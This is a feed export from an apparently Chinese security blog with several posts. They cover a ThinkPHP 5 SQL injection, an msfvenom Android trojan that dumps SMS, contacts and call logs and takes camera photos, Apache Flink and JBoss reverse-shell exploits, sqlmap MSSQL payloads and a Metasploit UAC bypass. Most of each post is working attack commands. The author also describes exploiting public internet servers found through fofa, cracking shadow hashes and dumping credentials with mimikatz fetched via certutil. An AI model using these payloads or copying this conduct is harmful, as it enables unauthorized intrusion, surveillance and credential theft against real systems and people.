    <content type="html"><![CDATA[<p>跟着mochazz大佬的文章来的，原项目地址在这里：<a href="https://github.com/Mochazz/ThinkPHP-Vuln" title="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>漏洞成因：Build类中的parseData函数对用户的数据没有做任何的过滤，导致用户可直接构造sql语句造成注入<br>影响范围：5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5 </p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里搞了好久，说一下流程</p><p>先要有mysql+php的环境(phpstudy或者linux下apt-get)</p><p>安装composer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install composer</span><br></pre></td></tr></table></figure></p><p>然后获取我们的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>获取的目录就在当前的文件夹下，然后开始配置<br>将 composer.json 文件的 require 字段设置成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username/a&apos;);</span><br><span class="line">        db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">        return &apos;Update success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 application/database.php 文件中配置数据库相关信息，并开启 application/config.php 中的 app_debug 和 app_trace 。创建数据库信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>访问我们的<br> <strong><a href="http://127.0.0.1/tpdemo/public/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&amp;username[2]=1" target="_blank" rel="noopener">http://127.0.0.1/tpdemo/public/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&amp;username[2]=1</a></strong></p><p><img src="/2019/11/20/Thinkphp5-insert注入/username.png" alt></p><p>访问成这样，说明搭建成功啦~</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这里我使用了phpstorm来跟踪函数</p><p>首先我们来到 \application\index\controller\index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username/a&apos;);</span><br><span class="line">        db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">        return &apos;Update success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里函数的大概意思是插入username，然后返回成功，这里我们跟踪insert函数</p><p>来到了 <strong>\thinkphp\library\think\db\Query.php</strong><br><img src="/2019/11/20/Thinkphp5-insert注入/insert.png" alt><br>看到2085这行代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</span><br></pre></td></tr></table></figure></p><p>调用了builder中的insert函数，这里的 <strong>$this-&gt;builder</strong>类在 <strong>\thinkphplibrary\think\db\Builder.php</strong>，然后我们找到这个类中的insert函数。</p><p><img src="/2019/11/20/Thinkphp5-insert注入/parseData.png" alt><br>继续跟踪parseData这个函数<br><img src="/2019/11/20/Thinkphp5-insert注入/key.png" alt><br>这里的$data参数为数组，这里赋值给了数组$val，但我们$val[0]的值为 <strong>inc</strong> 的时候，<strong>$result[$item]</strong>的值为<br><strong>parseKey($val[1]) . ‘+’ . floatval($val[2]);</strong></p><p>我们继续跟踪这个parseKey函数，发现没有任何的过滤<br><img src="/2019/11/20/Thinkphp5-insert注入/parse.png" alt><br>然后这个没有过滤的参数值通过<strong>$result</strong> 变量最终还给了insert函数中的$data参数，最终insert函数返回了带有恶意代码的$sql<br><img src="/2019/11/20/Thinkphp5-insert注入/sql.png" alt></p><p>再然后给了我们最开始的insert方法带入去查询<br><img src="/2019/11/20/Thinkphp5-insert注入/return.png" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1、这里第一个参数不仅仅可以为inc，看代码里面dec也可以利用<br><img src="/2019/11/20/Thinkphp5-insert注入/dec.png" alt></p><p>2、数组值必须为三个，缺少一个都不行<br><img src="/2019/11/20/Thinkphp5-insert注入/queshao.png" alt></p><p>大概就是总结这么多，明天再更新接下来的</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跟着mochazz大佬的文章来的，原项目地址在这里：&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot; title=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;漏洞成因：Build类中的parseData函数对用户的数据没有做任何的过滤，导致用户可直接构造sql语句造成注入&lt;br&gt;影响范围：5.0.13&amp;lt;=ThinkPHP&amp;lt;=5.0.15 、 5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.5 &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>利用msf渗透Android手机</title>
    <link href="http://yoursite.com/2019/11/18/%E5%88%A9%E7%94%A8msf%E6%B8%97%E9%80%8FAndroid%E6%89%8B%E6%9C%BA/"/>
    <id>http://yoursite.com/2019/11/18/利用msf渗透Android手机/</id>
    <published>2019-11-18T05:48:18.000Z</published>
    <updated>2020-01-13T04:48:52.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Kali:172.16.28.153<br>Android:172.16.28.158</p><a id="more"></a><p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/18/利用msf渗透Android手机/apk.png" alt></p><p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p>想办法让受害者点击这个木马apk，这里没有做免杀，手机肯定会报出病毒的警告</p><p><img src="/2019/11/18/利用msf渗透Android手机/meterpreter.png" alt></p><p>我们会拿到一个meterpreter，这里可以输入 help/? 来查看我们能够输入的命令<br><img src="/2019/11/18/利用msf渗透Android手机/core.png" alt></p><p>我们来测试几条经常使用的命令：<br>check_root //检测是否为root权限<br><img src="/2019/11/18/利用msf渗透Android手机/root.png" alt></p><p>webcam_snap    //通过摄像头拍照<br><img src="/2019/11/18/利用msf渗透Android手机/snap.png" alt></p><p>dump_calllog    //导出通话记录<br><img src="/2019/11/18/利用msf渗透Android手机/calllog.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/call.png" alt></p><p>dump_contacts    //导出通讯录<br><img src="/2019/11/18/利用msf渗透Android手机/concat.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/contact.png" alt></p><p>dump_sms    //导出短信内容<br><img src="/2019/11/18/利用msf渗透Android手机/sms.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/sms2.png" alt></p><p>app_list    //列出安装的app<br><img src="/2019/11/18/利用msf渗透Android手机/app.png" alt></p><p>还可以实时开启监控等命令，这里就不一一研究了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h1&gt;&lt;p&gt;Kali:172.16.28.153&lt;br&gt;Android:172.16.28.158&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="msf" scheme="http://yoursite.com/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>Apache Flink Jar包上传getshell漏洞</title>
    <link href="http://yoursite.com/2019/11/14/Apache-Flink-Jar%E5%8C%85%E4%B8%8A%E4%BC%A0getshell%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/</id>
    <published>2019-11-14T10:35:46.000Z</published>
    <updated>2020-01-13T04:48:58.427Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Flink下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>解压，进入bin目录，运行start-cluster.sh<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/start.png" alt></p><p>访问 <a href="http://ip:8081" target="_blank" rel="noopener">http://ip:8081</a></p><p><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/dashboard.png" alt></p><p>Kali启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f jar &gt; rce.jar</span><br></pre></td></tr></table></figure></p><p>生成jar文件木马，上传<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/submit.png" alt></p><p>msf打开监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/shell/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p>点击控制台里面的submit，看见shell反弹回来啦<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shell.png" alt></p><p>不过msf这里只有内网环境，刚好前两天小伙伴分享了frp内网穿透，就去配置了一下，然后在公网上找到了一个可以利用的点<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/ip.png" alt></p><p>还尼玛是root权限，这个漏洞危害真的高，可惜公网数量太少了<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shadow.png" alt></p><p>看到hash之后，用Kali下的john爆破</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Flink下载地址：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>JBoss AS 6.X 反序列化漏洞+getshell+实战(CVE-2017-12149)</title>
    <link href="http://yoursite.com/2019/11/11/JBosS-AS-6-X-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149/"/>
    <id>http://yoursite.com/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/</id>
    <published>2019-11-11T04:22:06.000Z</published>
    <updated>2020-01-13T05:03:30.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>CVE编号：CVE-2017-12149<br>影响版本：影响版本为JBoss5.x-6.x<br>漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>(Kali上一直复现不成功，这里我就用了两台ubuntu做实验)<br>攻击目标：192.168.43.131<br>攻击机器：192.168.43.140</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JBOSS 下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</span><br></pre></td></tr></table></figure><p>解压，编辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</span><br></pre></td></tr></table></figure></p><p>设置为允许远程访问<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/xml.png" alt></p><p>用nmap扫描服务器，发现8080端口<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/nmap.png" alt></p><p>访问 <strong><a href="http://192.168.43.131:8080" target="_blank" rel="noopener">http://192.168.43.131:8080</a></strong><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/8080.png" alt><br>长这个样子</p><p>然后访问 <strong>/invoker/readonly</strong> 这个位置<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/invoke.png" alt><br>返回500证明存在漏洞</p><p>首先用java的利用工具验证一下<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/linux.png" alt></p><p>这里可以执行命令了，但是还不能反弹shell</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a><br>下载这个JavaDeserH2HC工具，解压，进入目录下，然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line"></span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap targetip:port</span><br></pre></td></tr></table></figure></p><p>在本地监听端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure></p><p>然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://target:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/shell.png" alt><br>拿到shell</p><p>fofa一下的成果<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/ali.png" alt></p><p>然后发现就是system权限哦，服务器搭建一个apache，上传mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://xxxxx/mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/mimikatz.png" alt><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/3389.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;CVE编号：CVE-2017-12149&lt;br&gt;影响版本：影响版本为JBoss5.x-6.x&lt;br&gt;漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="实战" scheme="http://yoursite.com/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>通过sqlmap学习mssql注入(不写了)</title>
    <link href="http://yoursite.com/2019/11/10/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87sqlmap%E5%AD%A6%E4%B9%A0mssql%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/11/10/如何通过sqlmap学习mssql注入/</id>
    <published>2019-11-10T07:21:52.000Z</published>
    <updated>2020-01-13T04:49:15.351Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境：<br>windows 2008 + sql server 2008 + IIS7.5<br><a id="more"></a></p><h1 id="mysql和mssql注入"><a href="#mysql和mssql注入" class="headerlink" title="mysql和mssql注入"></a>mysql和mssql注入</h1><p>之前写过一篇<a href="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" title="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" target="_blank" rel="noopener">聊一聊 SQLMAP 在进行 sql 注入时的整个流程</a>，文中主要介绍了mysql环境下sqlmap注入的整体流程。对于mssql的注入，sqlmap其实也是换汤不换药，整体流程我会在接下来的文章中一一道出。</p><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><p>sqlmap判断依然是按照下面几个点来进行的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br><span class="line">Q: inline_query SQL injection(内联注入)</span><br></pre></td></tr></table></figure></p><p>我将注入点扔进sqlmap，判断出的注入类型：<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/panduan.png" alt></p><h1 id="判断基本信息"><a href="#判断基本信息" class="headerlink" title="判断基本信息"></a>判断基本信息</h1><p>为了方便查看sql语句，这里用burp suite设置代理抓包，sqlmap中添加参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--proxy=&apos;http://127.0.0.1:8080&apos;</span><br></pre></td></tr></table></figure></p><h2 id="基本信息查询"><a href="#基本信息查询" class="headerlink" title="基本信息查询"></a>基本信息查询</h2><p>首先我们来看下当前的用户<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/currentuser.png" alt><br>判断出来用户为sa，我这里将payload解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- mJCg</span><br></pre></td></tr></table></figure></p><p>这里可以看出sqlmap利用了联合查询注入的方式，我们将他分解开来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#首先可以看出sqlmap是判断出列的数量为3</span><br><span class="line">id=1 UNION ALL SELECT NULL,NULL,NULL--</span><br><span class="line">#然后将第二个NULL的值替换成</span><br><span class="line">CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113)</span><br></pre></td></tr></table></figure></p><p>我们再次分解这个NULL的值<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/char.png" alt><br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/sa.png" alt><br>关键能查出信息的还是ISNULL这句话<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/isnull.png" alt><br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/cast.png" alt><br>所以这里首先是将 <strong>SYSTEM_USER</strong> 转换成了char类型，这个时候ISNULL中的两个value都是char，然后就会返回第一个的值，也就是我们的SYSTEM_USER<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/cast.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- zZox</span><br></pre></td></tr></table></figure></p><p>同理sqlmap还可以查询(替换SYSTEM_USER)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DB_NAME()//当前数据库</span><br><span class="line">@@SERVERNAME//主机名</span><br></pre></td></tr></table></figure></p><p>(这里抛出一个问题让大家思考，sqlmap注入中一长串char字符是用来干什么的)</p><p>由于篇幅原因，这里贴出sqlmap检测中一些语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select name FROM sys.sql_logins//查询所有用户</span><br><span class="line">select master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins//查询所有的密码</span><br><span class="line">select IS_SRVROLEMEMBER(xxxx)//判断是否为dba权限</span><br></pre></td></tr></table></figure></p><h2 id="xp-shell"><a href="#xp-shell" class="headerlink" title="xp_shell"></a>xp_shell</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>启动/关闭xp_cmdshell：<a href="https://www.cnblogs.com/songsz1/archive/2012/12/26/2833856.html" target="_blank" rel="noopener">https://www.cnblogs.com/songsz1/archive/2012/12/26/2833856.html</a></p><p>《Windows server 2008 r2》配置IIS7+asp.net：<a href="https://blog.csdn.net/liang_operations/article/details/89980023" target="_blank" rel="noopener">https://blog.csdn.net/liang_operations/article/details/89980023</a></p><p>SQL Server xtype的介绍：<a href="https://www.2cto.com/database/201307/230722.html" target="_blank" rel="noopener">https://www.2cto.com/database/201307/230722.html</a></p><p>MSSQL注入提权的一些方法：<a href="https://www.cnblogs.com/FayJack/archive/2013/05/13/3075697.html" target="_blank" rel="noopener">https://www.cnblogs.com/FayJack/archive/2013/05/13/3075697.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验环境：&lt;br&gt;windows 2008 + sql server 2008 + IIS7.5&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Windows下bypassuac</title>
    <link href="http://yoursite.com/2019/11/08/Windows%E4%B8%8Bbypassuac/"/>
    <id>http://yoursite.com/2019/11/08/Windows下bypassuac/</id>
    <published>2019-11-08T11:27:00.000Z</published>
    <updated>2020-01-13T04:49:31.110Z</updated>
    
    <content type="html"><![CDATA[<p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！<br><a id="more"></a></p><h1 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h1><p>有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样<br><img src="/2019/11/08/Windows下bypassuac/error.png" alt><br>这个问题是要用管理员打开cmd才能添加账号<br><img src="/2019/11/08/Windows下bypassuac/cmd_1.png" alt><br><img src="/2019/11/08/Windows下bypassuac/cmd_2.png" alt><br>这个时候我们就要绕过windows的uac策略了</p><h1 id="Msf-bypassuac"><a href="#Msf-bypassuac" class="headerlink" title="Msf bypassuac"></a>Msf bypassuac</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#生成一个木马文件，放到目标机器上面</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.128 --platform windows lport=4444 -f exe &gt; uac.exe</span><br><span class="line"></span><br><span class="line">#打开msfconsole，设置监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br><span class="line">#然后在目标机器上面运行传上去的木马文件</span><br></pre></td></tr></table></figure><p>这个时候我们拿到了meterpreter<br><img src="/2019/11/08/Windows下bypassuac/getsystem_1.png" alt></p><p>getsystem是有问题的，说明不是最高权限</p><p>这个时候我们返回msf控制台，并保留session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#设置uac的payload</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/11/08/Windows下bypassuac/getsystem_2.png" alt><br>这个时候getsystem应该没有问题了<br><img src="/2019/11/08/Windows下bypassuac/success.png" alt></p><p>bypassuac成功，可以添加用户了</p><h1 id="cobalt-strike-bypassuac"><a href="#cobalt-strike-bypassuac" class="headerlink" title="cobalt strike bypassuac"></a>cobalt strike bypassuac</h1><p><img 